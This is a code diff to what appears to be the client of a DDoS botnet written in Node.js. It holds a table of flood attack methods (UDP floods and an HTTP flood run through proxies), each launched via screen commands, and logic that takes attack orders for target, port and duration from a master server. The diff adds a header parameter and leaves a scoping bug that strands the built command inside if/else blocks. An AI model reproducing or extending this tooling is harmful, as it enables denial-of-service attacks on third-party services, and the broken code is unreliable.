@@ -15,7 +15,7 @@ const METHODS = {
     "OVH-UDP": "screen -dmS %s ./methods/ovh-udp %s %i 4096 1 -1 %i",
     "UDP-RAPE": "screen -dmS %s ./methods/udp-rape %s %i 4096 1 -1 %i",
     "HTTP-FLOOD":
-        'screen -dmS %s node methods/browser/storm.js --url "%s" --host "ujustgotrekt.lol:%i" --time %i --mode socket --skip true --engine false --proxy methods/browser/proxies.txt',
+        'screen -dmS %s node methods/browser/storm.js --url "%s" --host "%s" --time %i --mode socket --skip true --engine false --proxy methods/browser/proxies.txt',
 }
 
 const ERRORS_TO_RETRY = [
@@ -91,13 +91,25 @@ client.on("data", function (data) {
         const host = data[1]
         const port = data[2]
         const time = data[3]
-        const cmd = util.format(
-            METHODS[method],
-            stripHost(host),
-            host,
-            port,
-            time
-        )
+        let header = undefined
+        if (data.length > 4) header = data[4]
+        if (header) {
+            const cmd = util.format(
+                METHODS[method],
+                stripHost(host),
+                host,
+                header,
+                time
+            )
+        } else {
+            const cmd = util.format(
+                METHODS[method],
+                stripHost(host),
+                host,
+                port,
+                time
+            )
+        }
         if (method == "HTTP-FLOOD") {
             // DOWNLOAD PROXIES AUTOMATICALLY FROM THE MASTER
             console.log(
